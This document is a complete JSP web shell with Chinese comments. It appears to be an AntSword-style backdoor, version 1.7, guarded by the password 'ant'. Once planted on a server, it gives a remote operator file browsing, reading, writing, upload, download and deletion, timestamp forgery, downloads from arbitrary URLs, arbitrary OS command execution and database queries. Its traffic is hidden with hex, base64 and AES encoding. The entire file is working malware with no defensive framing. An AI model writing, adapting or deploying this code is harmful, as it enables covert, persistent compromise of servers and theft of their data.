<%@page import="java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*,javax.crypto.*,java.security.*,javax.crypto.spec.*" contentType="text/html;charset=UTF-8"%>
<%!
// #################################################################
    String Pwd = "ant";         
    // 编码器
    // String encoder = "";               // default (明文)
    // String encoder = "base64";      // base64
     String encoder = "hex";         // hex(推荐)
    // String encoder = "aes";         // aes(加密方式见下文aes配置)

    // 解码器
    // String decoder = "";               // default (明文)
    // String decoder = "base64";      // base64 中文正常
    // String decoder = "hex";         // hex 中文可能有问题
    // String decoder = "hex_base64";  // hex(base64) // 中文正常
     String decoder = "aes_base64";  // aes(base64) (加密方式见下文aes配置)
    // 其它配置
    String cs = "UTF-8";                // 字符集编码
    String SessionKey = "CUSTOMSESSID"; // 自定义sessionkey id
    String RetS = "LT58";               // 数据起始分割符 base64
    String RetE = "fDwt";               // 数据结束分割符 base64
    
    /*
    *  aes-128-cfb_zero_padding:
    *   - aes_mode: CFB
    *   - aes_padding: NoPadding
    *   - aes_keylen: 16

    *  aes-256-ecb_zero_padding:
    *   - aes_mode: ECB
    *   - aes_padding: NoPadding
    *   - aes_keylen: 32
    */
    String aes_mode = "CFB";            // EBC|ECB|CFB|
    String aes_padding = "NoPadding";   // NoPadding|PKCS5Padding|PKCS7Padding
    int aes_keylen = 16;                // 16|32  // 16(AES-128) 32(AES-256)
    String aes_key_padding = "a";       
// ################################################################
    String AesKey = "";
    String Version = "1.7";

    String EC(String s) throws Exception {
        if(encoder.equals("hex") || encoder == "hex") return s;
        return new String(s.getBytes(), cs);
    }

    String showDatabases(String encode, String conn) throws Exception {
        String sql = "show databases";
        String columnsep = "\t";
        String rowsep = "";
        return executeSQL(encode, conn, sql, columnsep, rowsep, false);
    }

    String showTables(String encode, String conn, String dbname) throws Exception {
        String sql = "show tables from " + dbname;
        String columnsep = "\t";
        String rowsep = "";
        return executeSQL(encode, conn, sql, columnsep, rowsep, false);
    }

    String showColumns(String encode, String conn, String dbname, String table) throws Exception {
        String columnsep = "\t";
        String rowsep = "";
        String sql = "select * from " + dbname + "." + table + " limit 0,0";
        return executeSQL(encode, conn, sql, columnsep, rowsep, true);
    }

    String query(String encode, String conn, String sql) throws Exception {
        String columnsep = "\t|\t";
        String rowsep = "\r\n";
        return executeSQL(encode, conn, sql, columnsep, rowsep, true);
    }

    String executeSQL(String encode, String conn, String sql, String columnsep, String rowsep, boolean needcoluname)
            throws Exception {
        String ret = "";
        conn = (EC(conn));
        String[] x = conn.trim().replace("\r\n", "\n").split("\n");
        Class.forName(x[0].trim());
        String url = x[1] + "&characterEncoding=" +encode;
        Connection c = DriverManager.getConnection(url);
        Statement stmt = c.createStatement();
        ResultSet rs = stmt.executeQuery(sql);
        ResultSetMetaData rsmd = rs.getMetaData();

        if (needcoluname) {
            for (int i = 1; i <= rsmd.getColumnCount(); i++) {
                String columnName = rsmd.getColumnName(i);
                ret += columnName + columnsep;
            }
            ret += rowsep;
        }

        while (rs.next()) {
            for (int i = 1; i <= rsmd.getColumnCount(); i++) {
                String columnValue = rs.getString(i);
                ret += columnValue + columnsep;
            }
            ret += rowsep;
        }
        return ret;
    }

    String WwwRootPathCode(String d) throws Exception {
        String s = "";
        if (!d.substring(0, 1).equals("/")) {
            File[] roots = File.listRoots();
            for (int i = 0; i < roots.length; i++) {
                s += roots[i].toString().substring(0, 2) + "";
            }
        } else {
            s += "/";
        }
        return s;
    }

    String FileTreeCode(String dirPath) throws Exception {
        File oF = new File(dirPath), l[] = oF.listFiles();
        String s = "", sT, sQ, sF = "";
        java.util.Date dt;
        String fileCode=(String)System.getProperties().get("file.encoding");
        SimpleDateFormat fm = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
        for (int i = 0; i < l.length; i++) {
            dt = new java.util.Date(l[i].lastModified());
            sT = fm.format(dt);
            sQ = l[i].canRead() ? "R" : "";
            sQ += l[i].canWrite() ? " W" : "";
            String nm = new String(l[i].getName().getBytes(fileCode), cs);
            if (l[i].isDirectory()) {
                s += nm + "/\t" + sT + "\t" + l[i].length() + "\t" + sQ + "\n";
            } else {
                sF += nm + "\t" + sT + "\t" + l[i].length() + "\t" + sQ + "\n";
            }
        }
        s += sF;
        return new String(s.getBytes(fileCode), cs);
    }

    String ReadFileCode(String filePath) throws Exception {
        String l = "", s = "";
        BufferedReader br = new BufferedReader(new InputStreamReader(new FileInputStream(new File(filePath)), cs));
        while ((l = br.readLine()) != null) {
            s += l + "\r\n";
        }
        br.close();
        return s;
    }

    String WriteFileCode(String filePath, String fileContext) throws Exception {
        String h = "0123456789ABCDEF";
        String fileHexContext = strtohexstr(fileContext);
        File f = new File(filePath);
        FileOutputStream os = new FileOutputStream(f);
        for (int i = 0; i < fileHexContext.length(); i += 2) {
            os.write((h.indexOf(fileHexContext.charAt(i)) << 4 | h.indexOf(fileHexContext.charAt(i + 1))));
        }
        os.close();
        return "1";
    }

    String DeleteFileOrDirCode(String fileOrDirPath) throws Exception {
        File f = new File(fileOrDirPath);
        if (f.isDirectory()) {
            File x[] = f.listFiles();
            for (int k = 0; k < x.length; k++) {
                if (!x[k].delete()) {
                    DeleteFileOrDirCode(x[k].getPath());
                }
            }
        }
        f.delete();
        return "1";
    }

    void DownloadFileCode(String filePath, HttpServletResponse r) throws Exception {
        int n;
        byte[] b = new byte[512];
        r.reset();
        ServletOutputStream os = r.getOutputStream();
        BufferedInputStream is = new BufferedInputStream(new FileInputStream(filePath));
        os.write(("->"+"|").getBytes(), 0, 3);
        while ((n = is.read(b, 0, 512)) != -1) {
            os.write(b, 0, n);
        }
        os.write(("|"+"<-").getBytes(), 0, 3);
        os.close();
        is.close();
    }

    String UploadFileCode(String savefilePath, String fileHexContext) throws Exception {
        String h = "0123456789ABCDEF";
        File f = new File(savefilePath);
        f.createNewFile();
        FileOutputStream os = new FileOutputStream(f,true);
        for (int i = 0; i < fileHexContext.length(); i += 2) {
            os.write((h.indexOf(fileHexContext.charAt(i)) << 4 | h.indexOf(fileHexContext.charAt(i + 1))));
        }
        os.close();
        return "1";
    }

    String CopyFileOrDirCode(String sourceFilePath, String targetFilePath) throws Exception {
        File sf = new File(sourceFilePath), df = new File(targetFilePath);
        if (sf.isDirectory()) {
            if (!df.exists()) {
                df.mkdir();
            }
            File z[] = sf.listFiles();
            for (int j = 0; j < z.length; j++) {
                CopyFileOrDirCode(sourceFilePath + "/" + z[j].getName(), targetFilePath + "/" + z[j].getName());
            }
        } else {
            FileInputStream is = new FileInputStream(sf);
            FileOutputStream os = new FileOutputStream(df);
            int n;
            byte[] b = new byte[1024];
            while ((n = is.read(b, 0, 1024)) != -1) {
                os.write(b, 0, n);
            }
            is.close();
            os.close();
        }
        return "1";
    }

    String RenameFileOrDirCode(String oldName, String newName) throws Exception {
        File sf = new File(oldName), df = new File(newName);
        sf.renameTo(df);
        return "1";
    }

    String CreateDirCode(String dirPath) throws Exception {
        File f = new File(dirPath);
        f.mkdir();
        return "1";
    }

    String ModifyFileOrDirTimeCode(String fileOrDirPath, String aTime) throws Exception {
        File f = new File(fileOrDirPath);
        SimpleDateFormat fm = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
        java.util.Date dt = fm.parse(aTime);
        f.setLastModified(dt.getTime());
        return "1";
    }

    String WgetCode(String urlPath, String saveFilePath) throws Exception {
        URL u = new URL(urlPath);
        int n = 0;
        FileOutputStream os = new FileOutputStream(saveFilePath);
        HttpURLConnection h = (HttpURLConnection) u.openConnection();
        InputStream is = h.getInputStream();
        byte[] b = new byte[512];
        while ((n = is.read(b)) != -1) {
            os.write(b, 0, n);
        }
        os.close();
        is.close();
        h.disconnect();
        return "1";
    }

    String SysInfoCode(HttpServletRequest r) throws Exception {
        String d = "";
        try {
            if(r.getSession().getServletContext().getRealPath("/") != null){
                d = r.getSession().getServletContext().getRealPath("/");
            }else{
                String cd = this.getClass().getResource("/").getPath();
                d = new File(cd).getParent();
            }
        } catch (Exception e) {
            String cd = this.getClass().getResource("/").getPath();
            d = new File(cd).getParent();
        }
        d = String.valueOf(d.charAt(0)).toUpperCase() + d.substring(1);
        String serverInfo = (String)System.getProperty("os.name");
        String separator = File.separator;
        String user = (String)System.getProperty("user.name");
        String driverlist = WwwRootPathCode(d);
        return d + "\t" + driverlist + "\t" + serverInfo + "\t" + user;
    }

    boolean isWin() {
        String osname = (String)System.getProperty("os.name");
        osname = osname.toLowerCase();
        if (osname.startsWith("win"))
            return true;
        return false;
    }

    String ExecuteCommandCode(String cmdPath, String command) throws Exception {
        StringBuffer sb = new StringBuffer("");
        String[] c = { cmdPath, !isWin() ? "-c" : "/c", command };
        Process p = Runtime.getRuntime().exec(c);
        CopyInputStream(p.getInputStream(), sb);
        CopyInputStream(p.getErrorStream(), sb);
        return sb.toString();
    }
    
    String getEncoding(String str) {
        String encode[] = new String[]{
                "UTF-8",
                "ISO-8859-1",
                "GB2312",
                "GBK",
                "GB18030",
                "Big5",
                "Unicode",
                "ASCII"
        };
        for (int i = 0; i < encode.length; i++){
            try {
                if (str.equals(new String(str.getBytes(encode[i]), encode[i]))) {
                    return encode[i];
                }
            } catch (Exception ex) {
            }
        }
        
        return "";
    }
    String strtohexstr(String fileContext)throws Exception{
        String h = "0123456789ABCDEF";
        byte[] bytes = fileContext.getBytes(cs);
        
        StringBuilder sb = new StringBuilder(bytes.length * 2);
        for (int i = 0; i < bytes.length; i++) {
            sb.append(h.charAt((bytes[i] & 0xf0) >> 4));
            sb.append(h.charAt((bytes[i] & 0x0f) >> 0));
        }
        String fileHexContext = sb.toString();
        return fileHexContext;
    }

    String asenc(String str, String decode) throws Exception{
        if(decode.equals("hex") || decode=="hex"){
            String ret = "";
            for (int i = 0; i < str.length(); i++) {
                int ch = (int) str.charAt(i);
                String s4 = Integer.toHexString(ch);
                ret = ret + s4;
            }
            return ret;
        }else if(decode.equals("base64") || decode == "base64"){
            String sb = "";
            sun.misc.BASE64Encoder encoder = new sun.misc.BASE64Encoder();
            sb = encoder.encode(str.getBytes());
            return sb;
        }else if(decode.equals("hex_base64") || decode == "hex_base64"){
            return asenc(asenc(str, "base64"), "hex");
        }else if(decode.equals("aes_base64") || decode == "aes_base64"){
            String sb1 = "";
            sb1 = AesEncrypt(AesKey, asenc(str, "base64"));
            return sb1.replace("\r\n","");
        }
        return str;
    }

    String decode(String str) {
        byte[] bt = null;
        try {
            sun.misc.BASE64Decoder decoder = new sun.misc.BASE64Decoder();
            bt = decoder.decodeBuffer(str);
        } catch (IOException e) {
            e.printStackTrace();
        }
        return new String(bt);
    }
    String decode(String str, String encode) throws Exception{
        if(encode.equals("hex") || encode=="hex"){
            if(str=="null"||str.equals("null")){
                return "";
            }
            String hexString = "0123456789ABCDEF";
            str = str.toUpperCase();
            ByteArrayOutputStream baos = new ByteArrayOutputStream(str.length()/2);
            String ss = "";
            for (int i = 0; i < str.length(); i += 2){
                ss = ss + (hexString.indexOf(str.charAt(i)) << 4 | hexString.indexOf(str.charAt(i + 1))) + ",";
                baos.write((hexString.indexOf(str.charAt(i)) << 4 | hexString.indexOf(str.charAt(i + 1))));
            }
            return baos.toString(cs);
        }else if(encode.equals("base64") || encode == "base64"){
            byte[] bt = null;
            sun.misc.BASE64Decoder decoder = new sun.misc.BASE64Decoder();
            bt = decoder.decodeBuffer(str);
            return new String(bt,cs);
        }else if(encode.equals("aes") || encode == "aes") {
            String str1 = AesDecrypt(AesKey, str);
            return str1.trim();
        }
        return str;
    }

    String AesEncrypt(String key, String cleartext) throws Exception {
        IvParameterSpec zeroIv = new IvParameterSpec(key.getBytes());
        SecretKeySpec keys = new SecretKeySpec(key.getBytes(), "AES");
        Cipher cipher = Cipher.getInstance(new String("AES/"+aes_mode+"/"+aes_padding));
        cipher.init(Cipher.ENCRYPT_MODE, keys, zeroIv);  
        byte[] encryptedData = cipher.doFinal(cleartext.getBytes("UTF-8"));
        sun.misc.BASE64Encoder encoder = new sun.misc.BASE64Encoder();
        String sb = encoder.encode(encryptedData);
        return sb;
    }

    String AesDecrypt(String key ,String encrypted) throws Exception {
        sun.misc.BASE64Decoder decoder = new sun.misc.BASE64Decoder();
        byte[] byteMi = decoder.decodeBuffer(encrypted);
        IvParameterSpec zeroIv = new IvParameterSpec(key.getBytes());
        SecretKeySpec keys = new SecretKeySpec(key.getBytes("UTF-8"), "AES");
        Cipher cipher = Cipher.getInstance(new String("AES/"+aes_mode+"/"+aes_padding));
        cipher.init(Cipher.DECRYPT_MODE, keys, zeroIv);
        byte[] decryptedData = cipher.doFinal(byteMi);
        return new String(decryptedData, "UTF-8");
    }

    String getKeyFromCookie(Cookie[] cookies){
        String key = "";
        StringBuilder result = new StringBuilder();
        if( cookies != null ){
            for (Cookie c : cookies) {
                if (c.getName().equals(SessionKey)) {
                    key = c.getValue();
                    break;
                }
            }
        }
        if(key.length() < aes_keylen){
            for(int i=0;key.length() < aes_keylen;i++){
                key += aes_key_padding;
            }
        }if(key.length() > aes_keylen){
            key = key.substring(0,aes_keylen);
        }
        return key;
    }

    void CopyInputStream(InputStream is, StringBuffer sb) throws Exception {
        String l;
        BufferedReader br = new BufferedReader(new InputStreamReader(is, cs));
        while ((l = br.readLine()) != null) {
            sb.append(l + "\r\n");
        }
        br.close();
    }%>
<%
    response.setContentType("text/html");
    request.setCharacterEncoding(cs);
    response.setCharacterEncoding(cs);
    StringBuffer output = new StringBuffer("");
    StringBuffer sb = new StringBuffer("");
    Cookie cookie = new Cookie(SessionKey, session.getId());
    response.addCookie(cookie);
    try {
        AesKey = getKeyFromCookie(request.getCookies());
        String funccode = EC(request.getParameter(Pwd) + "");
        String z0 = decode(EC(request.getParameter("z0")+""), encoder);
        String z1 = decode(EC(request.getParameter("z1") + ""), encoder);
        String z2 = decode(EC(request.getParameter("z2") + ""), encoder);
        String z3 = decode(EC(request.getParameter("z3") + ""), encoder);
        String[] pars = { z0, z1, z2, z3};
        output.append(decode(RetS,"base64"));

        if (funccode.equals("B")) {
            sb.append(FileTreeCode(pars[1]));
        } else if (funccode.equals("C")) {
            sb.append(ReadFileCode(pars[1]));
        } else if (funccode.equals("D")) {
            sb.append(WriteFileCode(pars[1], pars[2]));
        } else if (funccode.equals("E")) {
            sb.append(DeleteFileOrDirCode(pars[1]));
        } else if (funccode.equals("F")) {
            DownloadFileCode(pars[1], response);
        } else if (funccode.equals("U")) {
            sb.append(UploadFileCode(pars[1], pars[2]));
        } else if (funccode.equals("H")) {
            sb.append(CopyFileOrDirCode(pars[1], pars[2]));
        } else if (funccode.equals("I")) {
            sb.append(RenameFileOrDirCode(pars[1], pars[2]));
        } else if (funccode.equals("J")) {
            sb.append(CreateDirCode(pars[1]));
        } else if (funccode.equals("K")) {
            sb.append(ModifyFileOrDirTimeCode(pars[1], pars[2]));
        } else if (funccode.equals("L")) {
            sb.append(WgetCode(pars[1], pars[2]));
        } else if (funccode.equals("M")) {
            sb.append(ExecuteCommandCode(pars[1], pars[2]));
        } else if (funccode.equals("N")) {
            sb.append(showDatabases(pars[0], pars[1]));
        } else if (funccode.equals("O")) {
            sb.append(showTables(pars[0], pars[1], pars[2]));
        } else if (funccode.equals("P")) {
            sb.append(showColumns(pars[0], pars[1], pars[2], pars[3]));
        } else if (funccode.equals("Q")) {
            sb.append(query(pars[0], pars[1], pars[2]));
        } else if (funccode.equals("A")) {
            sb.append(SysInfoCode(request));
        }else{
            sb.append(Version);
        }
    } catch (Exception e) {
        sb.append("ERROR" + ":// " + e.toString());
    }
    try {
        output.append(asenc(sb.toString(), decoder));
    }catch (Exception e) {
        sb.append("ERROR" + ":// " + e.toString());
    }
    output.append(decode(RetE, "base64"));
    out.print(output.toString());
%>
